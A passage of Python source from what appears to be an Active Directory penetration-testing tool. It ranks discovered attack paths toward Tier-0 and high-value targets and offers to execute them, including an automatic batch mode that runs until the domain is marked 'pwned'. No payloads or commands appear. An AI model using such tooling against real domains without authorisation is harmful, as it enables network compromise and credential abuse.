        return False

    fallback_compute = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        target="all",
        target_mode=target_mode,
        display_friendly=display_friendly,
    )
    try:
        fallback_summaries = fallback_compute()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if not fallback_summaries:
        _print_no_attack_paths_warning(
            domain=domain,
            start=start,
            start_norm=start_norm,
            target="all",
            target_mode=target_mode,
        )
        return False

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=fallback_summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(
            target="all", target_mode=target_mode
        ),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=fallback_compute,
        snapshot_scope=snapshot_scope or start_norm or "domain",
        snapshot_target="all",
        snapshot_target_mode=target_mode,
    )


def _offer_sectioned_attack_paths(
    shell: Any,
    domain: str,
    *,
    summaries: list[dict[str, Any]],
    max_display: int = 20,
    target_mode: str = "object",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
    recompute_summaries: Any = None,
    snapshot_scope: str = "domain",
    snapshot_target: str = "all",
    snapshot_target_mode: str = "object",
) -> bool:
    """Display attack paths grouped Tier-0, then high-value, then pivots."""
    # Canonical ordering is applied inside offer_attack_paths_for_execution_summaries
    # via order_attack_paths_for_display, which already groups by priority
    # class (Tier 0 → high-value → pivot) before choke-point ranking, so
    # no separate regrouping is needed here.
    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=summaries,
        show_sections=True,
        max_display=max_display,
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=recompute_summaries,
        snapshot_scope=snapshot_scope,
        snapshot_target=snapshot_target,
        snapshot_target_mode=snapshot_target_mode,
    )


def offer_attack_paths_for_execution_for_principals(
    shell: Any,
    domain: str,
    *,
    principals: list[str],
    max_depth: int = 10,
    max_display: int = 20,
    target: str = "highvalue",
    target_mode: str = "object",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
) -> bool:
    """Offer attack paths for a list of user principals and optionally execute one.

    This is used by batch credential discovery flows (e.g. password spraying)
    to avoid printing one identical group-originating path per user.
    """

    def _compute_summaries() -> list[dict[str, Any]]:
        return get_attack_path_summaries(
            shell,
            domain,
            scope="principals",
            principals=principals,
            max_depth=max_depth,
            max_paths=None,
            target=target,
            target_mode=target_mode,
        )

    try:
        summaries = _compute_summaries()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if target == "all":
        return _offer_sectioned_attack_paths(
            shell,
            domain,
            summaries=summaries,
            max_display=max_display,
            target_mode=target_mode,
            context_username=context_username,
            context_password=context_password,
            allow_execute_all=allow_execute_all,
            default_execute_all=default_execute_all,
            execute_only_statuses=execute_only_statuses,
            retry_attempted=retry_attempted,
            recompute_summaries=_compute_summaries,
            snapshot_scope="principals",
            snapshot_target="all",
            snapshot_target_mode=target_mode,
        )

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(
            target=target, target_mode=target_mode
        ),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=_compute_summaries,
        snapshot_scope="principals",
        snapshot_target=target,
        snapshot_target_mode=target_mode,
    )


def _summary_match_tokens(summary: dict[str, Any]) -> set[str]:
    """Collect the lower-cased identifiers a ``selected`` policy can match on.

    A configured ``attack_paths.selected`` entry matches a path summary when it
    equals (case-insensitively) the path id, its source node, or its target
    node. We also derive source/target from ``nodes`` / ``title`` so a config
    written against the rendered ``source -> target`` still matches.
    """
    tokens: set[str] = set()
    for key in ("id", "path_id", "source", "target", "target_name", "source_name"):
        value = summary.get(key)
        if value:
            tokens.add(str(value).strip().lower())
    nodes = summary.get("nodes") if isinstance(summary.get("nodes"), list) else []
    if nodes:
        tokens.add(str(nodes[0]).strip().lower())
        tokens.add(str(nodes[-1]).strip().lower())
    title = str(summary.get("title") or "")
    if "->" in title:
        for part in title.split("->"):
            cleaned = part.strip().lower()
            if cleaned:
                tokens.add(cleaned)
    return {t for t in tokens if t}


def _apply_attack_path_policy(
    shell: Any, domain: str, summaries: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    """Filter ``summaries`` per the scan-config attack-path execution policy.

    Returns the (possibly narrowed) list of summaries the offer should act on.
    ``none`` returns an empty list (skip execution); ``selected`` keeps only the
    summaries matching a configured entry; ``all`` / ``interactive`` (default,
    or absent config) return the list unchanged.
    """
    from adscan_internal.services.scan_config import (
        ATTACK_PATH_POLICY_NONE,
        ATTACK_PATH_POLICY_SELECTED,
    )

    scan_config = getattr(shell, "scan_config", None)
    ap_cfg = getattr(scan_config, "attack_paths", None)
    policy = getattr(ap_cfg, "policy", None)

    if policy == ATTACK_PATH_POLICY_NONE:
        print_info(
            "Attack-path execution skipped (disabled in scan configuration)."
        )
        return []

    if policy == ATTACK_PATH_POLICY_SELECTED:
        wanted = {str(s).strip().lower() for s in getattr(ap_cfg, "selected", ())}
        if not wanted:
            return summaries
        filtered = [
            s
            for s in summaries
            if isinstance(s, dict) and (_summary_match_tokens(s) & wanted)
        ]
        if not filtered:
            print_warning(
                "No discovered attack path matched the scan configuration's "
                "selected set; skipping execution."
            )
        return filtered

    # ``all`` and ``interactive`` (and any unknown value) keep the full set.
    return summaries


def offer_attack_paths_for_execution_summaries(
    shell: Any,
    domain: str,
    *,
    summaries: list[dict[str, Any]] | None,
    max_display: int = 20,
    search_mode_label: str | None = None,
    show_sections: bool = False,
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
    recompute_summaries: Callable[[], list[dict[str, Any]]] | None = None,
    snapshot_scope: str = "domain",
    snapshot_target: str = "highvalue",
    snapshot_target_mode: str = "object",
    auto_continue_theoretical_in_non_interactive: bool = True,
) -> bool:
    """Shared UX loop for showing/executing already computed path summaries.

    When ``show_sections=True`` the table renders Tier-0 first, then
    high-value paths, then pivots. Callers must pass summaries pre-grouped
    in that order.

    Default policy (centralised so CI and interactive callers behave the
    same way without each having to remember the right kwargs):

    * ``auto_continue_theoretical_in_non_interactive=True`` — in
      non-interactive contexts, once no ``theoretical`` paths remain the
      loop converges cleanly rather than re-prompting. This stops the
      "infinite re-prompt" regression seen in CI runs where post-execution
      paths transition to ``attempted``/``exploited`` and would otherwise
      be re-selected because the actionability gate admits ``attempted``.
    * ``execute_only_statuses=None`` resolves to ``{"theoretical"}`` in
      non-interactive contexts (set internally below). In interactive
      contexts ``None`` keeps the broader default (``theoretical`` +
      ``attempted``) so the operator can retry attempted paths manually
      if they want — CI never auto-retries.
    """
    if not summaries:
        return False

    # Honor the scan-config attack-path execution policy (one SSOT gate for both
    # the CI non-interactive branch and the interactive offer). ``none`` skips
    # execution entirely; ``selected`` narrows the offered set to the listed
    # path ids/targets; ``all`` / ``interactive`` (default) keep today's
    # behavior. Absent config = interactive = unchanged.
    summaries = _apply_attack_path_policy(shell, domain, summaries)
    if not summaries:
        return False

    marked_domain = mark_sensitive(domain, "domain")

    # Track whether the domain was already compromised when we entered the UX.
    # If execution flips the domain into "pwned" during this session, we stop
    # offering additional paths to avoid noisy/redundant prompts.
    was_pwned_at_start = (
        getattr(shell, "domains_data", {}).get(domain, {}).get("auth") == "pwned"
        if isinstance(getattr(shell, "domains_data", None), dict)
        else False
    )

    non_interactive = is_non_interactive(shell=shell)

    print_info_debug(
        "[attack_paths] UX start: "
        f"domain={marked_domain} non_interactive={non_interactive!r} "
        f"was_pwned_at_start={was_pwned_at_start!r} "
        f"summaries={len(summaries) if isinstance(summaries, list) else 0}"
    )

    def _is_theoretical_status(value: object) -> bool:
        return str(value or "").strip().lower() == "theoretical"

    def _confirm_or_default(prompt: str, *, default: bool) -> bool:
        """Return `default` in non-interactive contexts to avoid blocking for input."""
        if hasattr(shell, "_questionary_confirm"):
            resolved = shell._questionary_confirm(
                prompt,
                default=default,
                timeout_result=False,
                context={
                    "remote_interaction": True,
                    "category": "attack_path_execution",
                    "domain": domain,
                },
            )
            if isinstance(resolved, bool):
                return resolved
        if non_interactive:
            print_info_debug(
                "[attack_paths] confirm defaulted (non-interactive): "
                f"domain={marked_domain} prompt={mark_sensitive(prompt, 'detail')} default={default!r}"
            )
            return default
        return Confirm.ask(prompt, default=default)

    def _refresh_summaries() -> list[dict[str, Any]]:
        # Force-drop every attack-path cache layer before recomputing.
        # The on-disk graph has just been mutated by the execution we are
        # refreshing for — relying on the mtime-based invalidation that
        # ``save_attack_graph`` triggers is correct under normal POSIX
        # timing but can silently miss on filesystems with coarse mtime
        # resolution. Centralising the drop here matches the user
        # expectation: "after an execution, the next list MUST reflect
        # the change".
        from adscan_internal.services.attack_graph_service import (
            force_fresh_attack_paths_recompute,
        )
        force_fresh_attack_paths_recompute(
            domain, reason="post_execution_refresh"
        )

        # ORDER MATTERS: annotate FIRST so the canonical sort key in
        # ``order_attack_paths_for_display`` can read
        # ``meta["execution_target_viability_status"]`` (populated by the
        # annotator) and demote paths whose terminal host is unreachable
        # from the current vantage. Sorting before annotation would leave
        # ``viability_rank=0`` for every record and silently lose the
        # reachable-target-first ordering inside the same priority bucket.
        base = (
            list(summaries) if recompute_summaries is None else list(recompute_summaries() or [])
        )
        autocorrect_summary_statuses_from_steps(base, domain=domain)
        annotated = _annotate_execution_readiness(
            shell,
            domain=domain,
            summaries=base,
            context_username=context_username,
            context_password=context_password,
        )
        return order_attack_paths_for_display(annotated)

    def _domain_now_pwned() -> bool:
        domains_data = getattr(shell, "domains_data", None)
        if not isinstance(domains_data, dict):
            return False
        domain_data = domains_data.get(domain, {})
        if not isinstance(domain_data, dict):
            return False
        return domain_data.get("auth") == "pwned"

    # Status-filter policy:
    # * Explicit ``execute_only_statuses`` from the caller always wins.
    # * If the caller passed ``None`` and we are in a non-interactive
    #   context, narrow the default to ``{"theoretical"}`` so CI never
    #   auto-retries a path that already transitioned to ``attempted``,
    #   ``blocked``, or any non-theoretical state. This is the canonical
    #   safety policy: CI runs the happy path; the operator decides
    #   manually whether to retry edge cases.
    # * Interactive callers passing ``None`` keep the broader default so
    #   the operator can re-execute an attempted path on demand — the
    #   actionability gate downstream still admits ``theoretical`` and
    #   ``attempted`` in that case.
    if execute_only_statuses:
        desired_statuses_set: set[str] | None = {
            str(s).strip().lower() for s in execute_only_statuses
        }
    elif non_interactive:
        desired_statuses_set = {"theoretical"}
        print_info_debug(
            "[attack_paths] desired_statuses auto-narrowed to "
            "{'theoretical'} for non-interactive run: "
            f"domain={marked_domain}"
        )
    else:
        desired_statuses_set = None

    # Initial annotation: the summaries passed by the caller are already fresh
    # (just computed). Annotate them in-place without calling recompute_summaries,
    # which would trigger a redundant full recomputation (including any interactive
    # engine selector). The recompute_summaries callback is reserved for subsequent
    # refresh calls after a path has been executed.
    #
    # Canonical UX ordering is applied here once. ``order_attack_paths_for_display``
    # is the single source of truth that both the table renderer and the
    # selector prompt below consume — they cannot diverge by construction.
    # Sectioned mode does not need a secondary regroup: the canonical key
    # already orders by priority class (Tier 0 → high-value → pivot) before
    # applying choke-point ranking within each class.
    # ORDER MATTERS: annotate FIRST so the canonical sort key sees the
    # populated ``meta["execution_target_viability_status"]`` and demotes
    # unreachable-target paths within their priority bucket.
    summaries = order_attack_paths_for_display(
        _annotate_execution_readiness(
            shell,
            domain=domain,
            summaries=summaries,
            context_username=context_username,
            context_password=context_password,
        )
    )
    persist_attack_path_snapshot(
        shell,
        domain,
        summaries=summaries,
        scope=snapshot_scope,
        target=snapshot_target,
        target_mode=snapshot_target_mode,
        search_mode_label=search_mode_label,
    )
    print_info_debug(
        f"[attack_paths] summaries refreshed: domain={marked_domain} count={len(summaries)}"
    )
    actionable_paths = [
        summary
        for summary in summaries
        if _path_is_actionable_for_execution_prompt(
            summary, desired_statuses=desired_statuses_set
        )
    ]
    print_attack_paths_summary(
        domain,
        summaries,
        max_display=min(max_display, len(summaries)),
        search_mode_label=search_mode_label,
        actionable_count=len(actionable_paths),
        show_sections=show_sections,
    )
    if not actionable_paths:
        non_actionable_total, reasons = _summarize_non_actionable_paths(
            summaries,
            desired_statuses=desired_statuses_set,
        )
        reason_summary = _format_non_actionable_reason_summary(reasons)
        if (
            reasons["needs_context"] > 0
            and non_actionable_total == reasons["needs_context"]
        ):
            print_warning(
                "No actionable attack paths are currently executable because the "
                "available paths have no usable execution credential context."
            )
        elif (
            reasons["unsupported"] > 0
            and non_actionable_total == reasons["unsupported"]
        ):
            print_warning(
                "No actionable attack paths are currently executable because the "
                "available paths are not implemented for execution."
            )
        else:
            print_info(
                "No actionable attack paths are currently executable. "
                "You can still inspect the discovered paths."
            )
        print_info(f"Current path summary: {reason_summary}")
        print_info_debug(
            "[attack_paths] initial list has no actionable paths; keeping detail UX enabled: "
            f"domain={marked_domain} non_actionable={non_actionable_total} "
            f"exploited={reasons['exploited']} blocked={reasons['blocked']} "
            f"unsupported={reasons['unsupported']} unavailable={reasons['unavailable']} "
            f"needs_context={reasons['needs_context']} filtered={reasons['status_filtered']} "
            f"other={reasons['other']}"
        )

    executed = False

    # In non-interactive contexts we usually run a single selection cycle and
    # return. CI can opt into a safer chained mode that executes one
    # theoretical path at a time, recomputes, and repeats until no theoretical
    # candidates remain. This avoids the redundancy of a static "execute all"
    # batch while still converging to a fixpoint automatically.
    single_pass = non_interactive and not auto_continue_theoretical_in_non_interactive

    # In non-interactive auto-continue mode, paths whose status stays
    # "theoretical" after a blocked/unsupported/declined cycle would be
    # re-picked forever (default_idx always lands on the first theoretical
    # candidate). Track indices that have already been attempted in this
    # loop so we skip past them. The set is keyed by the position in
    # ``summaries``; ``_refresh_summaries`` preserves order so it stays
    # stable across iterations within a single ordering, but gets cleared
    # on refresh because the ordering may change.
    _tried_idx_set: set[int] = set()

    # Identity-stable guardrail (DEFENCE IN DEPTH): survives refreshes
    # AND survives broken step-status updates. The index set above is
    # reset every refresh; the actionability gate trusts ``status``
    # which a buggy exec might fail to update. Without this third layer
    # a single missed status write turns into an infinite re-prompt
    # loop. Keyed by ``attack_path_session_signature`` which hashes the
    # logical path (source + target + node sequence), so the same path
    # gets the same signature even when the summary dict is rebuilt by
    # the recompute callback.
    #
    # Semantics:
    # * Recorded the moment we DISPATCH execution, not when execution
    #   completes — that way even a primitive that raises mid-flight or
    #   leaves status partially written still gets blocked from re-pick.
    # * Used by the default-selection logic to skip past signatures we
    #   have already tried in this UX loop, AND by the option renderer
    #   to surface "just attempted" badges so the operator sees the
    #   state explicitly instead of having a phantom default mysteriously
    #   land on a different path.
    _attempted_signatures: set[Any] = set()

    def _mark_path_attempted(summary: dict[str, Any]) -> None:
        """Record this path as attempted in the current session.

        Called immediately before dispatching execution so a primitive
        that crashes mid-execution still gets the signature recorded.
        Silent no-op when the summary has no derivable signature — see
        :func:`attack_path_session_signature` for the rationale.
        """
        sig = attack_path_session_signature(summary)
        if sig is not None:
            _attempted_signatures.add(sig)

    def _path_was_attempted_this_session(summary: dict[str, Any]) -> bool:
        """Return ``True`` when this path has already been attempted.

        Used by the default-selection logic and the option renderer to
        avoid re-suggesting a path the operator (or CI) already tried,
        regardless of what its ``status`` field claims.
        """
        sig = attack_path_session_signature(summary)
        return sig is not None and sig in _attempted_signatures

    def _record_attempt(idx: int) -> None:
        """Mark a path index as attempted in both tracking layers.

        Wraps the legacy ``_tried_idx_set`` (refresh-scoped, index-based)
        and the new ``_attempted_signatures`` (session-scoped,
        identity-based) so every call site that previously did
        ``_tried_idx_set.add(idx)`` now activates BOTH guardrails with
        a single helper call. Bounds-checked because some refuse paths
        re-call this after a refresh shrank the list.
        """
        _tried_idx_set.add(idx)
        if 0 <= idx < len(summaries):
            _mark_path_attempted(summaries[idx])

    while True:
        # Option labels include a "just attempted" suffix for paths whose
        # logical signature was already recorded in this session — gives
        # the operator immediate feedback ("yes, this is the same path I
        # just executed, not a phantom retry"). The suffix is appended
        # after the canonical ``[status]`` so accessibility tools that
        # parse the line still see the status as the first bracketed
        # token.
        options = []
        for idx, summary in enumerate(summaries[:max_display]):
            label = (
                f"{idx + 1}. {summary.get('source')} -> "
                f"{summary.get('target')} [{summary.get('status')}]"
            )
            if _path_was_attempted_this_session(summary):
                label = f"{label} · just attempted"
            options.append(label)
        if allow_execute_all:
            options.append("Execute all remaining attack paths (recommended for CI)")
        options.append("Skip attack path execution")

        execute_all_idx = len(options) - 2 if allow_execute_all else None
        skip_idx = len(options) - 1
        # Default selection rule:
        # - If batch execution is enabled and explicitly defaulted, prefer the batch option
        #   when there is at least one eligible candidate.
        # - Otherwise pick the first theoretical path that has NOT been
        #   attempted in this session yet. The session-wide signature
        #   guardrail (``_attempted_signatures``) is the load-bearing
        #   defence-in-depth that prevents infinite loops when a path's
        #   step status fails to update after a successful or failed
        #   execution (the actionability gate would still admit the
        #   path as theoretical otherwise).
        default_idx = skip_idx
        if allow_execute_all and default_execute_all and execute_all_idx is not None:
            candidates_exist = any(
                (
                    (
                        str(summary.get("status") or "theoretical").strip().lower()
                        != "exploited"
                    )
                    and _status_allowed_by_filter(
                        str(summary.get("status") or "theoretical").strip().lower(),
                        desired_statuses_set,
                    )
                    and not _path_was_attempted_this_session(summary)
                )
                for summary in summaries
            )
            if candidates_exist:
                default_idx = execute_all_idx
        if default_idx == skip_idx:
            default_idx = next(
                (
                    idx
                    for idx, summary in enumerate(summaries[:max_display])
                    if _is_theoretical_status(summary.get("status"))
                    and idx not in _tried_idx_set
                    and not _path_was_attempted_this_session(summary)
                ),
                skip_idx,
            )

        selected_idx = None
        if hasattr(shell, "_questionary_select"):
            try:
                selected_idx = shell._questionary_select(
                    "Select an attack path to view details:",
                    options,
                    default_idx=default_idx,
                    context={
                        "remote_interaction": True,
                        "category": "attack_path_execution",
                        "domain": domain,
                        "candidate_count": len(summaries),
                    },
                )
            except TypeError:
                selected_idx = shell._questionary_select(
                    "Select an attack path to view details:",
                    options,
                    default_idx=default_idx,
                )
        elif non_interactive:
            selected_idx = default_idx
        else:
            prompt_default = "0" if default_idx >= skip_idx else str(default_idx + 1)
            selection = Prompt.ask(
                "Select an attack path index (or 0 to skip)", default=prompt_default
            )
            try:
                selection_idx = int(selection)
            except ValueError:
                selection_idx = 0
            if selection_idx <= 0:
                selected_idx = len(options) - 1
            else:
                selected_idx = min(selection_idx - 1, len(options) - 1)

        if selected_idx is None:
            print_info_debug(
                f"[attack_paths] selection cancelled: domain={marked_domain}"
            )
            return executed

        if selected_idx >= skip_idx:
            print_info_debug(
                f"[attack_paths] user skipped execution: domain={marked_domain}"
            )
            return executed

        if (
            allow_execute_all
            and execute_all_idx is not None
            and selected_idx == execute_all_idx
        ):
            # Batch execution mode: attempt remaining theoretical paths (by default)
            candidates: list[dict[str, Any]] = []
            skipped_no_context = 0
            skipped_unsupported = 0
            skipped_blocked = 0
            for summary in summaries:
                status = str(summary.get("status") or "theoretical").strip().lower()
                if not _status_allowed_by_filter(status, desired_statuses_set):
                    continue
                if not retry_attempted and status == "attempted":
                    continue
                if status == "exploited":
                    continue
                meta = (
                    summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
                )
                support_status = (
                    str(meta.get("execution_support_status") or "").strip().lower()
                    if isinstance(meta, dict)
                    else ""
                )
                if support_status == "blocked":
                    skipped_blocked += 1
                    continue
                if not _path_is_supported_for_execution(summary):
                    skipped_unsupported += 1
                    continue
                if not _path_has_ready_execution_context(summary):
                    skipped_no_context += 1
                    continue
                candidates.append(summary)

            if not candidates:
                if skipped_unsupported > 0:
                    print_warning(
                        "No remaining attack paths are supported for execution with "
                        "their current target types."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_unsupported={skipped_unsupported}"
                    )
                if skipped_blocked > 0:
                    print_warning(
                        "No remaining attack paths are executable because their target "
                        "hosts are currently not viable from this vantage."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_blocked={skipped_blocked}"
                    )
                if skipped_no_context > 0:
                    print_warning(
                        "No remaining attack paths are currently executable with the "
                        "stored credential context."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_no_context={skipped_no_context}"
                    )
                print_info_verbose("No remaining attack paths eligible for execution.")
                print_info_debug(
                    f"[attack_paths] batch: domain={marked_domain} no eligible candidates"
                )
                return executed

            if skipped_unsupported > 0:
                print_info(
                    f"Skipping {skipped_unsupported} attack path(s) that are not "
                    "implemented for their current target types."
                )
                print_info_debug(
                    "[attack_paths] batch support pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_unsupported={skipped_unsupported}"
                )
            if skipped_blocked > 0:
                print_info(
                    f"Skipping {skipped_blocked} attack path(s) whose target hosts are "
                    "not currently viable from this vantage."
                )
                print_info_debug(
                    "[attack_paths] batch host-viability pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_blocked={skipped_blocked}"
                )
            if skipped_no_context > 0:
                print_info(
                    f"Skipping {skipped_no_context} attack path(s) with no usable "
                    "execution credential context."
                )
                print_info_debug(
                    "[attack_paths] batch pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_no_context={skipped_no_context}"
                )

            if not _confirm_or_default(
                f"Execute {len(candidates)} attack path(s) now?",
                # If the user picked the batch option, default to yes; in CI/non-interactive
                # we should not block for input.
                default=True,
            ):
                continue

            for idx, summary in enumerate(candidates, start=1):
                try:
                    print_info_debug(
                        f"[batch] Executing attack path {idx}/{len(candidates)}: "
                        f"{summary.get('source')} -> {summary.get('target')} [{summary.get('status')}]"
                    )
                    attempted = execute_selected_attack_path(
                        shell,
                        domain,
                        summary=summary,
                        context_username=context_username,
                        context_password=context_password,
                        search_mode_label=_resolve_summary_search_mode_label(
                            summary,
                            default_search_mode_label=search_mode_label,
                            show_sections=show_sections,
                        ),
                    )
                    executed = executed or attempted
                    if attempted and not was_pwned_at_start and _domain_now_pwned():
                        print_info_debug(
                            "[attack_paths] stopping after compromise: "
                            f"domain={marked_domain} auth transitioned to pwned"
                        )
                        return executed
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    # Keep going; execution is best-effort.
                    continue
            return executed

        selected = summaries[selected_idx]
        selected_search_mode_label = _resolve_summary_search_mode_label(
            selected,
            default_search_mode_label=search_mode_label,
            show_sections=show_sections,
        )
        print_attack_path_detail(
            domain,
            selected,
            index=selected_idx + 1,
            search_mode_label=selected_search_mode_label,
        )

        status = str(selected.get("status") or "theoretical").lower()
        selected_meta = (
            selected.get("meta") if isinstance(selected.get("meta"), dict) else {}
        )
        execution_context_required = bool(
            isinstance(selected_meta, dict)
            and selected_meta.get("execution_context_required")
        )
        execution_support_status = (
            str(selected_meta.get("execution_support_status") or "").strip().lower()
            if isinstance(selected_meta, dict)
            else ""
        )
        if execution_support_status == "blocked":
            warning_message, debug_reason = _execution_block_message(selected_meta)
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            blocked_target_label = str(
                selected_meta.get("execution_target_label")
                or selected.get("target")
                or ""
            ).strip()
            blocked_viability_status = str(
                selected_meta.get("execution_target_viability_status") or ""
            ).strip()
            blocked_matched_ips: list[str] = list(
                selected_meta.get("execution_target_matched_ips") or []
            )
            blocked_action = str(
                selected_meta.get("execution_context_action") or ""
            ).strip()

            # --- Stale-snapshot advisory for unreachable hosts ------------------
            # The vantage report is a snapshot. In real engagements workstations
            # go offline and come back between scan and execution. Offer a fresh
            # TCP probe instead of hard-blocking, so operators don't miss a valid
            # path just because the host was down at scan time.
            go_hard_block = True
            if (
                blocked_viability_status == "resolved_but_unreachable"
                and blocked_target_label
                and not is_non_interactive()
            ):
                probe_result = _run_stale_snapshot_probe(
                    target_label=blocked_target_label,
                    matched_ips=blocked_matched_ips,
                    action=blocked_action,
                )
                if probe_result is not None and probe_result.status == "open":
                    # Host is up — let execution proceed. The pre-flight inside
                    # _verify_attack_step_native will confirm again before auth.
                    print_info_debug(
                        "[attack_paths] stale-snapshot probe overrode blocked gate: "
                        f"domain={marked_domain} action={marked_action} "
                        f"probe={probe_result.status} port={probe_result.port}"
                    )
                    go_hard_block = False
                elif probe_result is None:
                    # User declined the probe — hard block without extra noise
                    pass

            if go_hard_block:
                print_warning(warning_message)
                print_info_debug(
                    "[attack_paths] execution pre-check blocked: "
                    f"domain={marked_domain} action={marked_action} "
                    f"reason={mark_sensitive(debug_reason, 'detail')}"
                )
                if blocked_target_label and blocked_viability_status in {
                    "resolved_but_unreachable",
                    "enabled_but_unresolved",
                    "not_in_enabled_inventory",
                }:
                    # Inference short-circuit: if every reasonable source
                    # (direct vantage + every probed pivot) has already
                    # failed to reach the target, don't run the pivot UX
                    # again. The first time a target is blocked we DO run
                    # the pivot probe (so the negative evidence gets
                    # persisted); on subsequent paths sharing the same
                    # target, we save the cost.
                    from adscan_internal.services.target_reachability_inference_service import (
                        infer_target_reachability,
                    )
                    _skip_pivot_offer = False
                    for _matched_ip in blocked_matched_ips:
                        _verdict = infer_target_reachability(
                            shell, domain=domain, target_ip=_matched_ip
                        )
                        if _verdict.globally_unreachable:
                            _skip_pivot_offer = True
                            print_info_debug(
                                "[attack_paths] skipping pivot UX — "
                                f"target globally unreachable: ip={mark_sensitive(_matched_ip, 'ip')} "
                                f"rationale={mark_sensitive(_verdict.rationale, 'detail')}"
                            )
                            break
                    if not _skip_pivot_offer:
                        maybe_offer_pivot_opportunity_for_host_viability(
                            shell,
                            domain=domain,
                            blocked_target=blocked_target_label,
                            viability_status=blocked_viability_status,
                            operator_summary=None,
                        )
                if single_pass:
                    return executed
                _record_attempt(selected_idx)
                continue
            # else: fall through — execution proceeds with stale-snapshot overridden
        if execution_support_status == "unsupported":
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            marked_reason = mark_sensitive(
                str(
                    selected_meta.get("execution_support_reason")
                    or "Unsupported target type"
                ),
                "detail",
            )
            print_warning(
                "This path is not currently implemented for execution with its "
                "current target type."
            )
            print_info_debug(
                "[attack_paths] execution pre-check blocked: "
                f"domain={marked_domain} action={marked_action} reason={marked_reason}"
            )
            if single_pass:
                return executed
            _record_attempt(selected_idx)
            continue
        execution_ready_count = (
            selected_meta.get("execution_ready_count")
            if isinstance(selected_meta, dict)
            else None
        )
        computer_viability_status = (
            str(selected_meta.get("execution_target_viability_status") or "")
            .strip()
            .lower()
            if isinstance(selected_meta, dict)
            else ""
        )
        computer_viability_summary = (
            str(selected_meta.get("execution_target_viability_summary") or "").strip()
            if isinstance(selected_meta, dict)
            else ""
        )
        computer_execution_advisory = (
            str(selected_meta.get("execution_target_execution_advisory") or "").strip()
            if isinstance(selected_meta, dict)
            else ""
        )
        if (
            execution_context_required
            and isinstance(execution_ready_count, int)
            and execution_ready_count <= 0
        ):
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            marked_reason = mark_sensitive(
                str(
                    selected_meta.get("execution_readiness_reason")
                    or "no_usable_execution_context"
                ),
                "detail",
            )
            print_warning(
                "This path currently has no usable execution credential context. "
                "Acquire a stored credential for one of the affected users or pick another path."
            )
            print_info_debug(
                "[attack_paths] execution pre-check blocked: "
                f"domain={marked_domain} action={marked_action} reason={marked_reason}"
            )
            if single_pass:
                return executed
            _record_attempt(selected_idx)
            continue
        if computer_viability_status in {
            "resolved_but_unreachable",
            "enabled_but_unresolved",
            "not_in_enabled_inventory",
        }:
            if computer_viability_summary:
                print_warning(
                    f"Computer target viability check: {computer_viability_summary}"
                )
            if computer_execution_advisory:
                print_info(f"Execution advisory: {computer_execution_advisory}")
            print_info_debug(
                "[attack_paths] computer target viability warning: "
                f"domain={marked_domain} status={mark_sensitive(computer_viability_status, 'detail')}"
            )

        if status == "exploited" and not _confirm_or_default(
            "This path is already exploited. Execute again?",
            default=False,
        ):
            print_info_debug(
                f"[attack_paths] execution skipped: domain={marked_domain} reason=already_exploited_no_reexec"
            )
            if single_pass:
                return executed
            _record_attempt(selected_idx)
            continue
        if desired_statuses_set is not None and not _status_allowed_by_filter(
            status, desired_statuses_set
        ):
            print_info_verbose(
                f"Skipping execution for this path (status={status}) due to execution filter."
            )
            print_info_debug(
                "[attack_paths] execution skipped: "
                f"domain={marked_domain} reason=status_filtered status={mark_sensitive(status, 'detail')}"
            )
            if single_pass:
                return executed
            _record_attempt(selected_idx)
            continue

        if not _confirm_or_default(
            "Execute this attack path now?",
            default=True,
        ):
            print_info_debug(
                f"[attack_paths] execution skipped: domain={marked_domain} reason=user_declined"
            )
            if single_pass:
                return executed
            _record_attempt(selected_idx)
            continue

        # Record the attempt BEFORE dispatching execution so that even
        # if the primitive raises mid-flight (or completes without
